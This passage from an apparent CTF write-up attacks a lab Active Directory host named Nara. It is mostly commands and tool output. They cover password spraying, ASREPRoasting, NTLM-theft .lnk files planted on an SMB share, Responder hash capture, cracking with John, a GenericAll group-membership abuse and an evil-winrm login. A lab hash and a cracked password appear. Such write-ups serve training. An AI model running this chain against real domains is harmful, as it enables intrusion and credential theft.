</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\k</span>rbtgt:krbtgt STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\N</span>ARA$:NARA$ STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\A</span>melia.O<span class="s1">&#39;Brien:Amelia.O&#39;</span>Brien STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\D</span>amian.Johnson:Damian.Johnson STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\H</span>elen.Robinson:Helen.Robinson STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\S</span>ara.O<span class="s1">&#39;Sullivan:Sara.O&#39;</span>Sullivan STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\J</span>asmine.Roberts:Jasmine.Roberts STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\D</span>eclan.Reynolds:Declan.Reynolds STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\J</span>odie.Summers:Jodie.Summers STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\C</span>arolyn.Hill:Carolyn.Hill STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\J</span>emma.Humphries:Jemma.Humphries STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.209.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\T</span>racy.White:Tracy.White STATUS_LOGON_FAILURE
</span></span></code></pre></div><ul>
<li>That didn&rsquo;t turn out as expected so the next thing on my list is the ASREPRoasting attack which should be possible to get any user hash due to Kerberos pre-authentication required attribute enabled on an object.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Impacket v0.12.0.dev1 - Copyright <span class="m">2023</span> Fortra
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Administrator doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Guest doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_CLIENT_REVOKED<span class="o">(</span>Clients credentials have been revoked<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User NARA$ doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Amelia.O&#39;</span>Brien doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Damian.Johnson doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Helen.Robinson doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Sara.O&#39;</span>Sullivan doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Jasmine.Roberts doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Declan.Reynolds doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Jodie.Summers doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Carolyn.Hill doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Jemma.Humphries doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Tracy.White doesn<span class="err">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</span></span></code></pre></div><ul>
<li>The last technique also didn&rsquo;t yield result as expected so i decided to run my kerbrute and enumerate users again just to be sure i am on the right path. But hehe, No users where discovered except from the <code>Administrator</code> and <code>Guest</code> user account which is as usual.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ kerbrute userenum --dc 192.168.209.30 --domain nara-security.com /usr/share/wordlists/seclist/Usernames/xato-net-10-million-usernames.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    __             __               __     
</span></span><span class="line"><span class="cl">   / /_____  _____/ /_  _______  __/ /____ 
</span></span><span class="line"><span class="cl">  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span><span class="line"><span class="cl">/_/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Version: v1.0.1 <span class="o">(</span>385cb2b<span class="o">)</span> - 08/14/24 - Ronnie Flathers @ropnop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2024/08/14 21:35:26 &gt;  Using KDC<span class="o">(</span>s<span class="o">)</span>:
</span></span><span class="line"><span class="cl">2024/08/14 21:35:26 &gt;   192.168.209.30:88
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2024/08/14 21:38:50 &gt;  <span class="o">[</span>+<span class="o">]</span> VALID USERNAME:       guest@nara-security.com
</span></span><span class="line"><span class="cl">2024/08/14 21:55:53 &gt;  <span class="o">[</span>+<span class="o">]</span> VALID USERNAME:       administrator@nara-security.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2024/08/14 23:13:00 &gt;  Done! Tested <span class="m">8295455</span> usernames <span class="o">(</span><span class="m">2</span> valid<span class="o">)</span> in 5854.516 seconds
</span></span></code></pre></div><ul>
<li>Moving on to the NTLM Theft technique i decided to use the <a href="https://github.com/Greenwolf/ntlm_theft.git"><code>ntlm_theft</code></a> tool from <em><strong>Green Wolf</strong></em> to exploit this by generating a malicious <code>.LNK</code> file that will get executed by the automated user in that share and then return their hashes. ( That is if there is any, but let try :] )</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python3 ntlm_theft.py -g all -s 192.168.45.235 -f <span class="nb">test</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Created: test/test.scf <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>url<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>icon<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.lnk <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.rtf <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>stylesheet<span class="o">)</span>.xml <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>fulldocx<span class="o">)</span>.xml <span class="o">(</span>OPEN<span class="o">)</span>       
</span></span><span class="line"><span class="cl">Created: test/test.htm <span class="o">(</span>OPEN FROM DESKTOP WITH CHROME, IE OR EDGE<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>includepicture<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>remotetemplate<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>frameset<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test-<span class="o">(</span>externalcell<span class="o">)</span>.xlsx <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.wax <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.m3u <span class="o">(</span>OPEN IN WINDOWS MEDIA PLAYER ONLY<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.asx <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.jnlp <span class="o">(</span>OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.application <span class="o">(</span>DOWNLOAD AND OPEN<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/test.pdf <span class="o">(</span>OPEN AND ALLOW<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/zoom-attack-instructions.txt <span class="o">(</span>PASTE TO CHAT<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/Autorun.inf <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
</span></span><span class="line"><span class="cl">Created: test/desktop.ini <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
</span></span><span class="line"><span class="cl">Generation Complete.
</span></span></code></pre></div><ul>
<li>After generating i uploaded the <code>test.lnk</code> file to each directory in the share cos i don&rsquo;t know where the automation is taking place ☹️.</li>
</ul>
<pre tabindex="0"><code>❯ smbclient \\\\192.168.165.30\\nara\\
Password for [WORKGROUP\sec-fortress]:
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; put test.lnk
putting file test.lnk as \test.lnk (0.7 kb/s) (average 0.7 kb/s)
smb: \&gt; cd IT
smb: \IT\&gt; put test.lnk
putting file test.lnk as \IT\test.lnk (1.5 kb/s) (average 0.9 kb/s)
smb: \IT\&gt; cd ..\
smb: \&gt; cd Documents\
smb: \Documents\&gt; put test.lnk
putting file test.lnk as \Documents\test.lnk (4.3 kb/s) (average 1.3 kb/s)
smb: \Documents\&gt; 
</code></pre><ul>
<li>Then started up <code>responder</code> and hell yeah i got user <code>Tracy.White</code> hash which we discovered earlier.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo responder -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.4.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  To support this project:
</span></span><span class="line"><span class="cl">  Github -&gt; https://github.com/sponsors/lgandx
</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--SNIP--
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 192.168.165.30
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : NARASEC<span class="se">\T</span>racy.White
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : Tracy.White::NARASEC:9bbf8934331a4560:7E3E7EB81FF46C2022052D262FF86FED:0101000000000000804E1194E3EEDA012C0D0C83CBDD665900000000020008004F0031003400450001001E00570
</span></span><span class="line"><span class="cl">049004E002D004300420041003200580050004B00420052005500300004003400570049004E002D004300420041003200580050004B0042005200550030002E004F003100340045002E004C004F00430041004C00030014004F00310034004
</span></span><span class="line"><span class="cl">5002E004C004F00430041004C00050014004F003100340045002E004C004F00430041004C0007000800804E1194E3EEDA0106000400020000000800300030000000000000000100000000200000452F70F2B66A34630BD52340E899C3B9A07
</span></span><span class="line"><span class="cl">2F2D5A53D205FCBB235EA806B7FB60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200330035000000000000000000
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> NARASEC<span class="se">\T</span>racy.White
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> NARASEC<span class="se">\T</span>racy.White
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> NARASEC<span class="se">\T</span>racy.White
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> NARASEC<span class="se">\T</span>racy.White
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> NARASEC<span class="se">\T</span>racy.White
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Exiting...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> NARASEC<span class="se">\T</span>racy.White
</span></span></code></pre></div><blockquote>
<p>You can also use the <a href="https://github.com/xct/hashgrab"><code>Hashgrab</code></a> tool by <em><strong><code>XCT</code></strong></em> to generate the <code>.LNK</code> file, haven&rsquo;t tried it before but it is worth the try at least.</p>
</blockquote>
<ul>
<li>EZPZ, Cracked this user hash and got the password with <code>JtR</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ john hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt 
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">zqwj041FGX       <span class="o">(</span>Tracy.White<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:01 DONE <span class="o">(</span>2024-08-15 07:25<span class="o">)</span> 0.7874g/s 1954Kp/s 1954Kc/s 1954KC/s zta729..zozorox92
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed.
</span></span></code></pre></div><ul>
<li>The goal is to always password spray, I mean on a CTF not real world engagement 🤣🥹, and see if there are any other users using that same password. Unfortunately, Only the user <code>Tracy.White</code> which we have acquired uses that credential.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cme smb 192.168.165.30 -u users.txt -p <span class="s2">&#34;zqwj041FGX&#34;</span> --continue-on-success
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">20348</span> x64 <span class="o">(</span>name:NARA<span class="o">)</span> <span class="o">(</span>domain:nara-security.com<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\A</span>dministrator:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\G</span>uest:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\k</span>rbtgt:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\N</span>ARA$:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\A</span>melia.O<span class="s1">&#39;Brien:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span></span><span class="line"><span class="cl"><span class="s1">SMB         192.168.165.30  445    NARA             [-] nara-security.com\Damian.Johnson:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span></span><span class="line"><span class="cl"><span class="s1">SMB         192.168.165.30  445    NARA             [-] nara-security.com\Helen.Robinson:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span></span><span class="line"><span class="cl"><span class="s1">SMB         192.168.165.30  445    NARA             [-] nara-security.com\Sara.O&#39;</span>Sullivan:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\J</span>asmine.Roberts:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\D</span>eclan.Reynolds:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\J</span>odie.Summers:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\C</span>arolyn.Hill:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>-<span class="o">]</span> nara-security.com<span class="se">\J</span>emma.Humphries:zqwj041FGX STATUS_LOGON_FAILURE 
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">445</span>    NARA             <span class="o">[</span>+<span class="o">]</span> nara-security.com<span class="se">\T</span>racy.White:zqwj041FGX
</span></span></code></pre></div><ul>
<li>The rule of thumb for me is always to load up bloodhound once i have valid credentials. So i use the <code>bloodhound-python</code> tool which uses LDAP to query domain information if you have valid set of credentials. You don&rsquo;t have to wait till you get foothold so you can run a SharpHound collector, Hell NO!!!!!!.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodhound-python -u <span class="s1">&#39;Tracy.White&#39;</span> -p <span class="s1">&#39;zqwj041FGX&#39;</span> -ns 192.168.165.30 -d nara-security.com -c all --zip --dns-timeout <span class="m">50</span>
</span></span><span class="line"><span class="cl">INFO: Found AD domain: nara-security.com
</span></span><span class="line"><span class="cl">INFO: Getting TGT <span class="k">for</span> user
</span></span><span class="line"><span class="cl">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>nara.nara-security.com:88<span class="o">)]</span> <span class="o">[</span>Errno -2<span class="o">]</span> Name or service not known
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: nara.nara-security.com
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: nara.nara-security.com
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">14</span> users
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">55</span> groups
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> gpos
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">3</span> ous
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">19</span> containers
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: Nara.nara-security.com
</span></span><span class="line"><span class="cl">INFO: Done in 02M 48S
</span></span><span class="line"><span class="cl">INFO: Compressing output into 20240815073121_bloodhound.zip
</span></span></code></pre></div><ul>
<li>Then uploaded the loot to bloodhound GUI and has shown below our user <code>Tracy.White</code> has <code>GenericAll</code> ACE to the <strong>&ldquo;Remote Access&rdquo;</strong> group. At least we would now be able to connect via <code>WinRM</code> or <code>RDP</code>  by adding our self to this groups respectively.</li>
</ul>
<p><img loading="lazy" src="https://i.imgur.com/65sZKQh.png" alt=""  />
</p>
<ul>
<li>We can carry out this operation by doing so, using the <code>net</code> tool on kali to add our self to the group and checking if this operation was successful.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add to group</span>
</span></span><span class="line"><span class="cl">❯ net rpc group addmem <span class="s2">&#34;REMOTE ACCESS&#34;</span> <span class="s2">&#34;Tracy.White&#34;</span> -U <span class="s2">&#34;nara-security.com&#34;</span>/<span class="s2">&#34;Tracy.White&#34;</span>%<span class="s2">&#34;zqwj041FGX&#34;</span> -S 192.168.165.30
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Confirm operation was successful</span>
</span></span><span class="line"><span class="cl">❯ net rpc group members <span class="s2">&#34;REMOTE ACCESS&#34;</span> -U <span class="s2">&#34;nara-security.com&#34;</span>/<span class="s2">&#34;Tracy.White&#34;</span>%<span class="s2">&#34;zqwj041FGX&#34;</span> -S 192.168.165.30
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NARASEC<span class="se">\J</span>odie.Summers
</span></span><span class="line"><span class="cl">NARASEC<span class="se">\T</span>racy.White
</span></span></code></pre></div><ul>
<li>We can then try to authenticate via <code>WinRM</code> using CrackMapExec and see if we truly have access &lt;#. Yes we do!</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ cme winrm 192.168.165.30 -u Tracy.White -p zqwj041FGX
</span></span><span class="line"><span class="cl">SMB         192.168.165.30  <span class="m">5985</span>   NARA             <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">20348</span> <span class="o">(</span>name:NARA<span class="o">)</span> <span class="o">(</span>domain:nara-security.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">HTTP        192.168.165.30  <span class="m">5985</span>   NARA             <span class="o">[</span>*<span class="o">]</span> http://192.168.165.30:5985/wsman
</span></span><span class="line"><span class="cl">HTTP        192.168.165.30  <span class="m">5985</span>   NARA             <span class="o">[</span>+<span class="o">]</span> nara-security.com<span class="se">\T</span>racy.White:zqwj041FGX <span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></span></code></pre></div><ul>
<li>So go ahead and login using the <code>evil-winrm</code> utility as user <code>Tracy.White</code> which should be successful.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i 192.168.165.30 -u Tracy.White -p zqwj041FGX
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.5
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">--SNIP--
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments&gt; whoami
</span></span><span class="line"><span class="cl">narasec<span class="se">\t</span>racy.white
</span></span></code></pre></div><ul>
<li>Now we have to load Post-Exploitation tools like <code>WinPEAS</code>, <code>Snaffler</code>, <code>LaZagne</code>, <code>MimiKatz</code> etc to see what we have. However majority of this tools where blocked by AV so i started manual enumeration and found this <code>automation.txt</code> file.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----         7/30/2023   8:05 AM            <span class="m">373</span> automation.txt
</span></span></code></pre></div><ul>
<li>The content looked like a powershell secure string which is used to help protect confidential text.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>racy.white<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> automation.txt
</span></span><span class="line"><span class="cl">Enrollment Automation Account
</span></span><span class="line"><span class="cl">
